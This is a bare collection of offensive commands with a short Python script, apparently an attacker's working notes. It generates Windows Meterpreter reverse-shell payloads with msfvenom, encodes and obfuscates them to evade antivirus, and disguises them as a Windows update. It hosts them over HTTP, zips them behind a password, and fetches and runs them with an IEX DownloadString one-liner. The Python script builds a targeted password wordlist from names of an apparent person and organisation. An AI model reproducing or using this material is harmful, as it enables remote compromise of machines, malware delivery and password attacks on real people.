msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -e x86/shikata_ga_nai -i 10 -f exe -o payload_encoded.exe

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f exe -o ~/win_update.exe

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f psh-cmd -o payload.ps1

python3 -m http.server 8080

Import-Module ./Invoke-Obfuscation.psd1
Invoke-Obfuscation


http://192.168.1.128:8080/update_pacth.exe

zip --password SuaSenhaForte payload_protegido.zip payload_encoded.exe

IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.128:8080/payload.ps1')


from itertools import product

# Bases para combinação
words = ['rsilva', 'atibaia', 'suma', 'sumaserv', 'admin']
years = [str(y) for y in range(2018, 2026)]
symbols = ['', '!', '@', '#']
capital_variations = lambda word: [word, word.capitalize(), word.upper()]

# Geração de combinações
combinations = []
for word in words:
    for variation in capital_variations(word):
        combinations.append(variation)
        for year in years:
            for symbol in symbols:
                combinations.append(f"{variation}{year}{symbol}")
                combinations.append(f"{variation}{symbol}{year}")

# Remover duplicatas
combinations = list(set(combinations))

# Salvar em arquivo
with open("wordlist_personalizada.txt", "w") as f:
    for combo in combinations:
        f.write(combo + "\n")

print(f"Wordlist personalizada criada com {len(combinations)} entradas!")




